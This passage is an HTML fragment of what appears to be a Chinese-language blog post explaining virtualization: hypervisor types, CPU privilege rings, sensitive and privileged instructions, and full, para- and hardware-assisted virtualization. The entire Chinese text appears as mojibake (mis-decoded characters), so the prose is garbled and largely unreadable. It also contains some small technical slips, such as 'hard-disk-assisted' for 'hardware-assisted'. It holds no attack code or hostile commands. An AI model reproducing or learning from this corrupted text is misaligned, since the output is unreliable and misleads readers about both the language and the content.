id="è™šæ‹ŸåŒ–åˆ†ç±»">è™šæ‹ŸåŒ–åˆ†ç±»</h1><p>ä»è™šæ‹ŸåŒ–çš„å®ç°æ–¹å¼æ¥çœ‹ï¼Œè™šæ‹ŸåŒ–æ¶æ„ä¸»è¦æœ‰ä¸‰ç§å½¢å¼ï¼šå¯„å±…è™šæ‹ŸåŒ–æ¶æ„ã€è£¸é‡‘å±è™šæ‹ŸåŒ–æ¶æ„å’Œæ“ä½œç³»ç»Ÿè™šæ‹ŸåŒ–æ¶æ„ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%9E%B6%E6%9E%84%E5%88%86%E7%B1%BB.png" alt="è™šæ‹ŸåŒ–æ¶æ„åˆ†ç±»"></p><p>ä»¥è™šæ‹ŸåŒ–æŠ€æœ¯ç»´åº¦ï¼Œä¸»è¦æœ‰ï¼šå…¨è™šæ‹ŸåŒ–ã€åŠè™šæ‹ŸåŒ–ã€ç¡¬ç›˜è¾…åŠ©è™šæ‹ŸåŒ–ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB.png" alt="è™šæ‹ŸåŒ–æŠ€æœ¯åˆ†ç±»"></p><h1 id="è™šæ‹ŸåŒ–æ¶æ„">è™šæ‹ŸåŒ–æ¶æ„</h1><h2 id="è£¸é‡‘å±è™šæ‹ŸåŒ–-Type1">è£¸é‡‘å±è™šæ‹ŸåŒ–(Type1)</h2><p>è£¸æœºè™šæ‹ŸåŒ–æŒ‡çš„æ˜¯ï¼Œ<strong>Hypervisor ç›´æ¥è¿è¡Œåœ¨ç¡¬ä»¶ä¸Šï¼Œå³ä»¥ Hypervisor ä½œä¸º Host OS ç›´æ¥ç®¡æ§ç¡¬ä»¶èµ„æº</strong>ã€‚ä¾‹å¦‚ <code>VMware ESXI</code> ä¾¿æ˜¯é‡‡ç”¨æ­¤ç§æ¶æ„çš„ Hypervisorã€‚è™šæ‹Ÿæœºæœ‰æŒ‡ä»¤è¦æ‰§è¡Œæ—¶ï¼ŒHypervisorä¼šæ¥ç®¡è¯¥æŒ‡ä»¤ï¼Œæ¨¡æ‹Ÿç›¸åº”çš„æ“ä½œã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E8%A3%B8%E9%87%91%E5%B1%9E%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF.png" alt="è£¸é‡‘å±è™šæ‹ŸåŒ–æŠ€æœ¯"></p><h2 id="å®¿ä¸»æœºè™šæ‹ŸåŒ–-Type2">å®¿ä¸»æœºè™šæ‹ŸåŒ–(Type2)</h2><p>å®¿ä¸»æœºè™šæ‹ŸåŒ–ï¼Œä¹Ÿå«å¯„å±…è™šæ‹ŸåŒ–ã€‚åœ¨ä¸€ä¸ªå®Œæ•´çš„è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œæœ€åº•å±‚æ˜¯ç‰©ç†ç¡¬ä»¶ï¼Œç‰©ç†ç¡¬ä»¶ä¹‹ä¸Šæ˜¯æ“ä½œç³»ç»Ÿï¼Œæ“ä½œç³»ç»Ÿä¹‹ä¸Šæ˜¯å„ç±»è½¯ä»¶å’Œè¿›ç¨‹ã€‚å¯„å±…è™šæ‹ŸåŒ–ä¾¿æ˜¯åœ¨ä¸»æœºæ“ä½œç³»ç»Ÿä¹‹ä¸Šå®‰è£…Hypervisorï¼Œä¹Ÿå«VMM(Virtual Machine Monitor,è™šæ‹Ÿæœºç®¡ç†å±‚)ï¼Œå†å¾€ä¸Šä¾¿æ˜¯è™šæ‹ŸåŒ–è½¯ä»¶æ‰€åˆ›å»ºçš„è™šæ‹Ÿæˆ·äº†ã€‚</p><p>å®¿ä¸»æœºè™šæ‹ŸåŒ–å®ç°æ–¹å¼æ˜¯ç›´æ¥å®‰è£…å’Œè¿è¡Œåº”ç”¨ç¨‹åºå³å¯ï¼Œä¾¿äºå®ç°ã€‚ä½†æ˜¯å› å…¶ä¸»è¦ä¾æ‰˜ä¸»æœºæ“ä½œç³»ç»Ÿå¯¹è®¾å¤‡çš„æ”¯æŒï¼Œæ€§èƒ½æŸè€—è¾ƒå¤§ã€‚å…¸å‹çš„äº§å“ä¸ºVMware Workstationsã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%AF%84%E5%B1%85%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF.png" alt="å¯„å±…è™šæ‹ŸåŒ–æŠ€æœ¯"></p><h2 id="æ“ä½œç³»ç»Ÿè™šæ‹ŸåŒ–-å®¹å™¨">æ“ä½œç³»ç»Ÿè™šæ‹ŸåŒ–(å®¹å™¨)</h2><p>éš”ç¦»æ€§å·®ï¼Œæœ€åä¸€ç§ä¸å¸¸ç”¨ï¼Œè™šæ‹Ÿæœºè¿è¡Œåœ¨ä¼ ç»Ÿæ“ä½œç³»ç»Ÿä¸Šï¼Œåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹ŸåŒ–å®ä¾‹ï¼ˆå®¹å™¨Containerï¼‰ï¼ŒæŒ‡å‘åº•å±‚æ‰˜ç®¡æ“ä½œç³»ç»Ÿï¼Œç¼ºç‚¹æ˜¯æ“ä½œç³»ç»Ÿå”¯ä¸€ï¼Œå¦‚æœåº•å±‚æ“ä½œç³»ç»Ÿè·‘çš„æ˜¯Windowsï¼Œé‚£ä¹ˆVPS/VEå°±éƒ½å¾—è·‘Windowsã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96%E6%9E%B6%E6%9E%84.png" alt="æ“ä½œç³»ç»Ÿè™šæ‹ŸåŒ–æ¶æ„"></p><blockquote><p>åœ¨å®¿ä¸»æ¶æ„ä¸­çš„è™šæ‹Ÿæœºä½œä¸ºä¸»æœºæ“ä½œç³»ç»Ÿçš„ä¸€ä¸ªè¿›ç¨‹æ¥è°ƒåº¦å’Œç®¡ç†ï¼Œè£¸é‡‘å±æ¶æ„ä¸‹åˆ™ä¸å­˜åœ¨ä¸»æœºæ“ä½œç³»ç»Ÿï¼Œå®ƒæ˜¯ä»¥Hypervisorç›´æ¥è¿è¡Œåœ¨ç‰©ç†ç¡¬ä»¶ä¹‹ä¸Šï¼Œå³ä½¿æ˜¯æœ‰ç±»ä¼¼ä¸»æœºæ“ä½œç³»ç»Ÿçš„çˆ¶åˆ†åŒºæˆ–Domain 0ï¼Œä¹Ÿæ˜¯ä½œä¸ºè£¸é‡‘å±æ¶æ„ä¸‹çš„è™šæ‹Ÿæœºå­˜åœ¨çš„ã€‚å®¿ä¸»æ¶æ„é€šå¸¸ç”¨äºä¸ªäººPCä¸Šçš„è™šæ‹ŸåŒ–ï¼Œå¦‚WindowsVirtual PCï¼ŒVMware Workstationï¼ŒVirtual Boxï¼ŒQemuç­‰ï¼Œè€Œè£¸é‡‘å±æ¶æ„é€šå¸¸ç”¨äºæœåŠ¡å™¨çš„è™šæ‹ŸåŒ–ã€‚</p></blockquote><h1 id="è™šæ‹ŸåŒ–æŠ€æœ¯">è™šæ‹ŸåŒ–æŠ€æœ¯</h1><h2 id="Ringç¯">Ringç¯</h2><blockquote><p>è¿™éƒ¨åˆ†ä¸€å®šè¦çŸ¥é“</p></blockquote><p>æ—©æœŸOSåœ¨è®¾è®¡æ—¶ï¼Œè®¾è®¡äº†ä¸€ä¸ªRing0-Ring3çš„æƒé™ç¯æœºåˆ¶ã€‚å…¶ä¸­åªç”¨åˆ°äº†Ring0å’ŒRing3ã€‚</p><ul><li><p><strong>Ring0è¢«ç§°ä¸ºå†…æ ¸æ€</strong>ï¼Œå³å¯¹ç¡¬ä»¶çš„æ•æ„Ÿæ“ä½œå‡åœ¨æ­¤ï¼›å¦‚æœè¿™é‡Œå‡ºç°é—®é¢˜ï¼Œç³»ç»Ÿå¾ˆå¯èƒ½ä¼šå´©æºƒã€‚å› ä¸ºring 0å¯ä»¥ç›´æ¥è®¿é—®CPUå’Œç³»ç»Ÿå†…å­˜ã€‚</p></li><li><p><strong>Ring1-2</strong>æ˜¯é©±åŠ¨å±‚ã€‚ring 1 å’Œring 2 æä¾›äº†ring 3 æ‰€ç¼ºä¹çš„ç‹¬ç‰¹ä¼˜åŠ¿ã€‚æ“ä½œç³»ç»Ÿä½¿ç”¨ring 1 ä¸è®¡ç®—æœºç¡¬ä»¶è¿›è¡Œäº¤äº’ã€‚è¿™ä¸ªæˆ’æŒ‡éœ€è¦è¿è¡Œå‘½ä»¤ï¼Œä¾‹å¦‚é€šè¿‡æˆ‘ä»¬ç›‘è§†å™¨ä¸Šçš„æ‘„åƒå¤´æµå¼ä¼ è¾“è§†é¢‘ã€‚å¿…é¡»ä¸ç³»ç»Ÿå­˜å‚¨ã€åŠ è½½æˆ–ä¿å­˜æ–‡ä»¶äº¤äº’çš„æŒ‡ä»¤å­˜å‚¨åœ¨ring 2 ä¸­ã€‚è¿™äº›æƒé™ç§°ä¸ºè¾“å…¥å’Œè¾“å‡ºæƒé™ï¼Œå› ä¸ºå®ƒä»¬æ¶‰åŠå°†æ•°æ®ä¼ å…¥å’Œä¼ å‡ºå·¥ä½œå†…å­˜RAMã€‚</p></li><li><p><strong>Ring3è¢«ç§°ä¸ºç”¨æˆ·æ€</strong>ï¼Œä¸€èˆ¬åº”ç”¨è½¯ä»¶çš„æ­£å¸¸æ“ä½œå‡åœ¨æ­¤ã€‚ç”±äºring 3æ— æ³•è®¿é—®CPUæˆ–å†…å­˜ï¼Œå› æ­¤æ¶‰åŠè¿™äº›çš„ä»»ä½•æŒ‡ä»¤éƒ½å¿…é¡»ä¼ é€’ç»™ring 0ã€‚</p></li></ul><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250215163603266.png" alt="image-20250215163603266"></p><p>å½“ç¨‹åºè¿è¡Œåœ¨ç”¨æˆ·æ¨¡å¼ï¼ˆRing 3ï¼‰æ—¶ï¼Œå¦‚æœéœ€è¦<strong>æ‰§è¡Œä¸€ä¸ªéœ€è¦æ›´é«˜æƒé™çš„æŒ‡ä»¤</strong>ï¼Œæ¯”å¦‚ç›´æ¥è®¿é—®ç¡¬ä»¶è®¾å¤‡ï¼Œå®ƒä¼šè§¦å‘ä¸€ä¸ªé™·é˜±ï¼ˆtrapï¼‰ï¼Œæ“ä½œç³»ç»Ÿä¼šæ•è·è¿™ä¸ªé™·é˜±å¹¶å†³å®šæ˜¯å¦å…è®¸è¯¥æ“ä½œã€‚å¦‚æœå…è®¸ï¼Œ<strong>æ“ä½œç³»ç»Ÿä¼šå°†CPUåˆ‡æ¢åˆ°æ›´é«˜çš„ç‰¹æƒçº§åˆ«ï¼ˆå¦‚Ring 0æˆ–1ï¼‰æ¥æ‰§è¡Œè¯¥æŒ‡ä»¤</strong>ã€‚</p><p>ä½†åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­ï¼Œ<strong>è¿™ç§ç‰¹æƒçº§åˆ«çš„åˆ‡æ¢ä¼šå˜å¾—æ›´åŠ å¤æ‚</strong>ã€‚è™šæ‹Ÿæœºç›‘æ§å™¨ï¼ˆHypervisor/VMMï¼‰éœ€è¦æ‹¦æˆªå®¢æˆ·æ“ä½œç³»ç»Ÿï¼ˆGuest OSï¼‰å‘å‡ºçš„æ•æ„ŸæŒ‡ä»¤ï¼Œ<strong>å³ä½¿è¯¥æŒ‡ä»¤åœ¨å®¢æˆ·æœºä¸­çœ‹ä¼¼è¿è¡Œåœ¨ç‰¹æƒçº§åˆ«ï¼ˆå¦‚Ring 0ï¼‰</strong>ã€‚ç”±äºè™šæ‹ŸåŒ–å±‚å¯¹ç¡¬ä»¶èµ„æºçš„ç»å¯¹æ§åˆ¶ï¼Œå®¢æˆ·æ“ä½œç³»ç»Ÿçš„&quot;Ring 0&quot;å®é™…ä¸Šæ˜¯ç»è¿‡è™šæ‹ŸåŒ–çš„éç‰¹æƒæ¨¡å¼ã€‚æ­¤æ—¶ï¼ŒHypervisorä¼šé€šè¿‡<strong>é™·å…¥å†æ¨¡æ‹Ÿï¼ˆTrap-and-Emulateï¼‰æœºåˆ¶</strong>æˆ–å€ŸåŠ©<strong>ç¡¬ä»¶è™šæ‹ŸåŒ–æ‰©å±•ï¼ˆå¦‚Intel VT-x/AMD-Vï¼‰</strong>ï¼Œåœ¨çœŸæ­£çš„ç‰©ç†ç‰¹æƒçº§åˆ«ï¼ˆå¦‚VMX rootæ¨¡å¼ï¼‰ä¸‹æ¨¡æ‹Ÿè¯¥æŒ‡ä»¤çš„æ‰§è¡Œï¼ŒåŒæ—¶ç¡®ä¿è™šæ‹ŸåŒ–ç¯å¢ƒçš„éš”ç¦»æ€§å’Œå®‰å…¨æ€§ã€‚</p><h2 id="ç‰¹æƒæŒ‡ä»¤ä¸æ•æ„ŸæŒ‡ä»¤">ç‰¹æƒæŒ‡ä»¤ä¸æ•æ„ŸæŒ‡ä»¤</h2><ul><li><strong>ç‰¹æƒæŒ‡ä»¤ï¼ˆPrivileged Instructionï¼‰</strong>ï¼šå¯¹äºç³»ç»Ÿä¸­ä¸€äº›æ•æ„Ÿèµ„æºçš„ç®¡ç†å’Œè¯»å†™çš„æŒ‡ä»¤è¢«å®šä½ç‰¹æƒæŒ‡ä»¤ï¼Œåªæœ‰å¤„äº Ring 0 æ‰èƒ½è¿›è¡Œæ­£ç¡®æ‰§è¡Œï¼Œå¦åˆ™ä¼šä¸¢å‡ºå¼‚å¸¸ï¼›</li><li><strong>æ•æ„ŸæŒ‡ä»¤ï¼ˆSensitive Instructionï¼‰</strong>ï¼šç”±äºè™šæ‹ŸåŒ–çš„å¼•å…¥ï¼Œç”±äº OS ç°åœ¨å¤„äº Ring1 æ‰€ä»¥ä¸èƒ½æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ï¼Œæ‰€ä»¥äº¤ç”± Ring 0 çš„ VMM æ¥å¤„ç†æ‰§è¡Œï¼Œè¿™éƒ¨åˆ†æŒ‡ä»¤ç§°ä¸ºæ•æ„ŸæŒ‡ä»¤ï¼›å¯ä»¥ç†è§£ä¸ºå®¢æˆ·æœºä¸­å¿…é¡»äº¤ç”± VMM å¤„ç†çš„æŒ‡ä»¤ï¼›</li></ul><p>å¯¹äºæœ‰è™šæ‹ŸåŒ–çš„ç¯å¢ƒï¼Œå®¢æˆ·æœºå¤„äº Ring 1 è€Œä¸æ˜¯ Ring 0ï¼Œå¦‚æœæ‰€æœ‰çš„æ•æ„ŸæŒ‡ä»¤éƒ½æ˜¯ç‰¹æƒæŒ‡ä»¤ï¼Œé‚£ä¹ˆæ‰§è¡Œä»»æ„çš„æ•æ„ŸæŒ‡ä»¤éƒ½ä¼šäº§ç”Ÿ trapï¼Œè¿™æ ·ä¿è¯äº†å®¢æˆ·æœºä¸­å¦‚æœè¿›è¡Œè¿™äº›â€œæ•æ„Ÿâ€æ“ä½œçš„æŒ‡ä»¤ï¼Œéƒ½ä¼šäº¤ç»™å¤„äº Ring 0 çš„ VMM å¤„ç†ï¼›</p><p>æ•æ„ŸæŒ‡ä»¤åŒ…æ‹¬ï¼š</p><ol><li>æ‰€æœ‰ I/O æŒ‡ä»¤ï¼›</li><li>ä¼å›¾è®¿é—®æˆ–è€…ä¿®æ”¹ VM mode æˆ–è€…æœºå™¨çŠ¶æ€çš„æŒ‡ä»¤ï¼›</li><li>ä¼å›¾è®¿é—®æˆ–è€…ä¿®æ”¹æ•æ„Ÿå¯„å­˜å™¨ / å­˜å‚¨å•å…ƒçš„æŒ‡ä»¤ï¼›</li><li>ä¼å›¾è®¿é—®å­˜å‚¨ä¿æŠ¤ç³»ç»Ÿæˆ–å†…å­˜ / åœ°å€åˆ†é…ç³»ç»Ÿçš„æŒ‡ä»¤ï¼›</li></ol><p>ä½†æ˜¯ x86 ä¸­æœ‰äº›æŒ‡ä»¤ï¼Œå¿…é¡»ç”±å¤„äº Ring 0 çŠ¶æ€çš„ VMM å¤„ç†ï¼Œä½†æ˜¯å·¥ä½œåœ¨ Ring 1 ä¸ä¼šäº§ç”Ÿ <strong>Trap</strong>ï¼Œè¿™æ ·çš„è¯å¦‚æœå¤„äº Ring 1 çš„å®¢æˆ·æœºæ‰§è¡Œè¿™äº›æŒ‡ä»¤ï¼Œä¸ä¼šäº§ç”Ÿ Trapï¼Œä¹Ÿä¸èƒ½è¢«å®šä¹‰ä¸ºç‰¹æƒæŒ‡ä»¤ï¼Œè¿™ä¸ä¸Šä¸€å¥ä¸­çš„ç›®çš„ç›¸å†²çªï¼Œæ‰€ä»¥å¿…é¡»ä¹Ÿè¦ Trap è¿™äº› â€œéç‰¹æƒæŒ‡ä»¤â€ï¼Œx86 ä¸­ç§°ä¹‹ä¸º <strong>ä¸´ç•ŒæŒ‡ä»¤ï¼ˆCritical Instructionsï¼‰</strong>ï¼›</p><p>æ‰€ä»¥ x86 ä¸­ï¼Œ<strong>æ•æ„ŸæŒ‡ä»¤ = ç‰¹æƒæŒ‡ä»¤</strong> + <strong>éç‰¹æƒæŒ‡ä»¤ / ä¸´ç•ŒæŒ‡ä»¤</strong>ï¼Œå¦‚æœä¸€ä¸ªç³»ç»Ÿä¸Š <strong>æ•æ„ŸæŒ‡ä»¤ = ç‰¹æƒæŒ‡ä»¤</strong>ï¼Œé‚£ä¹ˆä¸ºäº†è®© VMM å®Œå…¨æ§åˆ¶ç¡¬ä»¶èµ„æºï¼Œæˆ‘ä»¬è®©è™šæ‹Ÿæœºä¸Šçš„ OS å¤„äº Ring 1ï¼Œä¸èƒ½ç›´æ¥æ‰§è¡Œ <strong>æ•æ„Ÿ/ç‰¹æƒæŒ‡ä»¤</strong>ï¼Œè€Œ VMM å¤„äº RIng 0 ï¼Œæ‰€ä»¥ OS ä¸Šæ‰§è¡Œ <strong>æ•æ„Ÿ/ç‰¹æƒæŒ‡ä»¤</strong> çš„æ—¶å€™ï¼Œå°±ä¼š <strong>å¼•èµ·é™·å…¥ / cause a trap</strong> åˆ° VMMï¼Œå†ç”± VMM æ¥æ¨¡æ‹Ÿæ‰§è¡Œå¼•èµ·å¼‚å¸¸çš„æŒ‡ä»¤ï¼›</p><p><strong>ä¸´ç•ŒæŒ‡ä»¤</strong> åŒ…æ‹¬ <strong>æ•æ„ŸæŒ‡ä»¤</strong> ä¸­çš„ <strong>æ•æ„Ÿå¯„å­˜å™¨æŒ‡ä»¤</strong> å’Œ <strong>ä¿æŠ¤ç³»ç»ŸæŒ‡ä»¤</strong>ï¼›</p><h2 id="å…¨è™šæ‹ŸåŒ–">å…¨è™šæ‹ŸåŒ–</h2><p>ä¹Ÿç§°ä¸ºåŸå§‹è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œè¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Šçš„æ“ä½œç³»ç»Ÿé€šè¿‡Hypervisoræ¥æœ€ç»ˆåˆ†äº«ç¡¬ä»¶ï¼Œæ‰€ä»¥è™šæ‹Ÿæœºå‘å‡ºçš„æŒ‡ä»¤éœ€ç»è¿‡Hypervisoræ•è·å¹¶å¤„ç†ã€‚</p><p>è¿™æ˜¯VMwareæå‡ºçš„è§£å†³æ–¹æ¡ˆï¼š BT, Binary Translation äºŒè¿›åˆ¶ç¿»è¯‘æŠ€æœ¯, å³å°†<strong>æ‰€æœ‰ç‰¹æƒæŒ‡ä»¤</strong>é€šè¿‡VMMç¿»è¯‘ä¹‹åä¼ å‡º, æœ€åå†æŠŠç»“æœä¼ å›ç»™è™šæ‹Ÿæœºã€‚é€šè¿‡è¿™æ ·çš„æ–¹å¼, å°±æˆåŠŸçš„æ¬ºéª—äº†è™šæ‹Ÿæœº, è®©å®ƒä»¥ä¸ºè‡ªå·±åœ¨ 0 ç¯ï¼Œå³è™šæ‹Ÿæœºä¸çŸ¥é“è‡ªå·±æ˜¯è™šæ‹Ÿæœºã€‚å¦‚å›¾æ‰€ç¤ºã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%85%A8%E8%99%9A%E6%8B%9F%E5%8C%96.png" alt="å…¨è™šæ‹ŸåŒ–"></p><p>å…¨è™šæ‹ŸåŒ–æŠ€æœ¯ä¸éœ€è¦ä¿®æ”¹å®¢æˆ·æ“ä½œç³»ç»Ÿï¼Œå› æ­¤å…·æœ‰å¾ˆå¥½çš„å…¼å®¹æ€§å’Œå¯ç§»æ¤æ€§ã€‚ä½†è¿™ä¸ªæ–¹å¼æœ‰ä¸ªé—®é¢˜ï¼Œæ‰€æœ‰çš„æŒ‡ä»¤éƒ½éœ€è¦VMMè¿›è¡Œç¿»è¯‘ï¼Œæ€§èƒ½æŠ˜æ‰£å¤ªé«˜äº†ã€‚</p><h2 id="åŠè™šæ‹ŸåŒ–">åŠè™šæ‹ŸåŒ–</h2><p>æ€æƒ³ï¼šå°†æ•´ä¸ª<code>Guest OS</code>è¿è¡Œåœ¨éç‰¹æƒæ¨¡å¼ä¸‹ï¼Œé‡åˆ°æ•æ„ŸæŒ‡ä»¤ä¸­çš„ç‰¹æƒæŒ‡ä»¤ï¼Œå¯ä»¥é€šè¿‡é™·å…¥åˆ°vmmè¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œã€‚ä½†æœ‰äº›æ•æ„ŸæŒ‡ä»¤ä¸æ˜¯ç‰¹æƒæŒ‡ä»¤ï¼ŒåŠè™šæ‹ŸåŒ–çš„æ ¸å¿ƒå°±æ˜¯å°†<code>Guest OS</code>ä¸­çš„æ­¤ç±»æŒ‡ä»¤å…¨éƒ¨ä¿®æ”¹äº†ï¼Œé€šè¿‡hypercallç›´æ¥å’Œvmmé€šä¿¡,ä»è€Œè¾¾åˆ°é™·å…¥å†æ¨¡æ‹Ÿçš„æ•ˆæœï¼Œ<strong>ä¿®æ”¹æ“ä½œç³»ç»Ÿå†…æ ¸æ¥å°†ä¸å¯è™šæ‹ŸåŒ–çš„æŒ‡ä»¤æ›¿æ¢ä¸ºhypercallsï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹è™šæ‹ŸæœºçŸ¥é“è‡ªå·±æ˜¯è™šæ‹Ÿæœº</strong>ã€‚</p><p>åŠè™šæ‹ŸåŒ–ä¸æ”¯æŒæœªç»ä¿®æ”¹çš„æ“ä½œç³»ç»Ÿ(å¦‚Windows 2000/XP)ï¼Œå› æ­¤å®ƒçš„å…¼å®¹æ€§å’Œå¯ç§»æ¤æ€§è¾ƒå·®ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%8D%8A%E8%99%9A%E6%8B%9F%E5%8C%96.png" alt="åŠè™šæ‹ŸåŒ–"></p><p>åŠè™šæ‹Ÿå®é™…è¿è¡Œæ—¶ï¼Œè¦å®ç°å®šåˆ¶åŒ–çš„åŠŸèƒ½ï¼Œé¦–å…ˆè¦äº†è§£ API çš„ç‰¹æ€§ï¼Œå¹¶å›´ç»• API å®šåˆ¶å¯¹åº”çš„åŠŸèƒ½ï¼Œæ‰èƒ½åœ¨å·²æ”¹å˜å†…æ ¸çš„æ“ä½œç³»ç»Ÿä¸­å®ç°ã€‚</p><p>å¼€æºçš„Xené¡¹ç›®æ˜¯åŠè™šæ‹ŸåŒ–çš„ä¸€ä¸ªä¾‹å­ï¼Œå®ƒä½¿ç”¨ä¸€ä¸ªç»è¿‡ä¿®æ”¹çš„Linuxå†…æ ¸æ¥è™šæ‹ŸåŒ–å¤„ç†å™¨ï¼Œè€Œç”¨å¦å¤–ä¸€ä¸ªå®šåˆ¶çš„è™šæ‹Ÿæœºç³»ç»Ÿçš„è®¾å¤‡é©±åŠ¨æ¥è™šæ‹ŸåŒ–I/Oã€‚å®ƒé€šè¿‡Domain0è¿›è¡Œæ•æ„ŸæŒ‡ä»¤çš„æ“ä½œã€‚</p><h2 id="ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–">ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–</h2><p>è™šæ‹ŸåŒ–çš„æ ¸å¿ƒå°±æ˜¯å¦‚ä½•ä¿è¯<code>Guest OS</code>å¯ä»¥æ­£ç¡®çš„æ‰§è¡Œæ•æ„ŸæŒ‡ä»¤åˆä¸ç ´åvmmï¼Œx86 cpuå½“å‰çš„è¿è¡Œçº§åˆ«æ— æ³•æ»¡è¶³è¦æ±‚ï¼Œæ‰€ä»¥åªèƒ½ä»è½¯ä»¶ä¸Šå¼¥è¡¥ï¼Œä½†æ€§èƒ½ä¸Šç»ˆå½’å·®ç‚¹æ„æ€ã€‚ç¡¬ä»¶å¼€å‘å‚å•†æä¾›äº†æ–°çš„æ–¹æ³•ï¼Œç»™cpuè–ªèµ„ä¸€ç§æ¨¡å¼å®¢æˆ·æœºæ¨¡å¼ï¼ˆnon-rootæ¨¡å¼ï¼‰åŸå…ˆçš„æ¨¡å¼ç§°ä¸ºrootæ¨¡å¼ï¼Œæ¯ç§æ¨¡å¼æ‹¥æœ‰ring0~ring3ã€‚å¼•å…¥ä¸¤ç§æ¨¡å¼ä¹‹åï¼Œå‰é¢è®¨è®ºçš„éç‰¹æƒæŒ‡ä»¤çš„æ•æ„ŸæŒ‡ä»¤åœ¨non-rootæ¨¡å¼ä¸‹å¯ä»¥é‡æ–°å®šä¹‰ã€‚rootæ¨¡å¼ä¸‹è¡¨ç°å’ŒåŸå…ˆä¸€æ · ï¼Œè¿™æ ·å°±å®Œç¾çš„è§£å†³äº†è™šæ‹ŸåŒ–æ¼æ´çš„é—®é¢˜ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E7%A1%AC%E4%BB%B6%E8%BE%85%E5%8A%A9%E8%99%9A%E6%8B%9F%E5%8C%96.png" alt="ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–"></p><h1 id="è™šæ‹ŸåŒ–å¯¹è±¡">è™šæ‹ŸåŒ–å¯¹è±¡</h1><h2 id="CPUè™šæ‹ŸåŒ–">CPUè™šæ‹ŸåŒ–</h2><p>ç›®å‰ä¸»è¦çš„ CPU è™šæ‹ŸåŒ–æŠ€æœ¯æ˜¯ Intel çš„ VT-x/VT-i å’Œ AMD çš„ AMD-V è¿™ä¸¤ç§æŠ€æœ¯ã€‚</p><p>CPU è™šæ‹ŸåŒ–ä½¿ç”¨çš„ç»å…¸æ¨¡å‹æ˜¯ã€ŒTrap &amp; Emulateã€ï¼Œä½¿ç”¨<strong>ç‰¹æƒçº§å‹ç¼©</strong>ï¼ˆRing Compressionï¼‰çš„æ–¹å¼æ¥å®ç°è™šæ‹Ÿç¯å¢ƒï¼š</p><ul><li>Hypervisor è¿è¡Œåœ¨æœ€é«˜ç‰¹æƒçº§ä¸Šï¼ŒGuest VM è¿è¡Œåœ¨ä½ç‰¹æƒçº§ä¸Šï¼ŒGuest VM åœ¨ç¡¬ä»¶ä¸Šç›´æ¥æ‰§è¡Œéæ•æ„ŸæŒ‡ä»¤ï¼Œå½“ Guest VM æ‰§è¡Œåˆ°æ•æ„ŸæŒ‡ä»¤æ—¶ï¼Œå…¶ä¾¿ä¼šé™·å…¥ä½äºæœ€é«˜ç‰¹æƒçº§çš„ Hypervisor ï¼Œæ­¤æ—¶ä¾¿èƒ½ç”± Hypervisor æ¨¡æ‹Ÿæ•æ„ŸæŒ‡ä»¤çš„è¡Œä¸ºã€‚</li><li>å½“å‘ç”Ÿ virtual CPU è°ƒåº¦æ—¶ï¼Œæˆ‘ä»¬å°† vCPU çš„çŠ¶æ€ä¿å­˜ï¼Œæ¢å¤ Hypervisor çŠ¶æ€ï¼ŒHypervisor å®Œæˆå…¶è¡Œä¸ºåè¿›è¡Œä¸‹ä¸€ virtual CPU çš„è°ƒåº¦ï¼Œæ¢å¤ä¸‹ä¸€ vCPU çš„çŠ¶æ€å¹¶æ¢å¤æ‰§è¡Œã€‚</li></ul><h3 id="çº¯è½¯ä»¶å®ç°CPUè™šæ‹ŸåŒ–">çº¯è½¯ä»¶å®ç°CPUè™šæ‹ŸåŒ–</h3><p>å‰æ–‡æˆ‘ä»¬å·²ç»æŒ‡å‡º x86 æ¶æ„å­˜åœ¨<strong>éç‰¹æƒæ•æ„ŸæŒ‡ä»¤ï¼Œç›´æ¥å¯¼è‡´ VMM æ— æ³•æˆªè· x86 VM çš„æ•æ„Ÿè¡Œä¸º</strong>ï¼Œè¿™è¿åäº† <code>Popek and Goldberg virtualization requirements</code>ï¼Œå› æ­¤åœ¨ç¡¬ä»¶å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒå‡ºç°ä¹‹å‰ï¼Œè™šæ‹ŸåŒ–å‚å•†åªå¥½å…ˆä»è½¯ä»¶å±‚é¢ä¸‹æ‰‹ã€‚</p><h4 id="æ¨¡æ‹Ÿ-è§£é‡Šæ‰§è¡Œ">æ¨¡æ‹Ÿ&amp; 